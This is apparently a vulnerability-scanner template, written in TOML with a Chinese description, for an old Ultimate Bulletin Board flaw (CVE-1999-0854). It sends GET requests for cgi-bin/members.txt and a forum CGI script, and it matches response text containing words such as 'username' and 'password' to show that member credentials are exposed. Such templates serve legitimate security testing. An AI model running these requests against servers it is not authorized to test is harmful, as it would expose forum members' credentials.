[info]
author = "ave"
description = "Ultimate Bulletin Board 将数据文件（如 members.txt）存储在 cgi-bin 目录下，远程攻击者通过 HTTP GET 请求直接访问这些文件路径，若服务器尝试以 CGI 执行失败则返回文件明文内容，导致敏感信息泄露。"
id = "POC-AVE-1999-0653"
name = "Ultimate Bulletin Board 数据文件泄露 PoC"
severity = "medium"
tags = ["ave-1999-0653"]
vuln_id = [
    "CVE-1999-0854",
    "AVE-1999-0653",
]

[poc]
logic = "any"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/cgi-bin/members.txt"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "username",
    "password",
    "email",
    "Member",
]

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/cgi-bin/ubb_forum_topic.cgi"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "Content-Type: text/html",
    "Content-Type: text/plain",
]
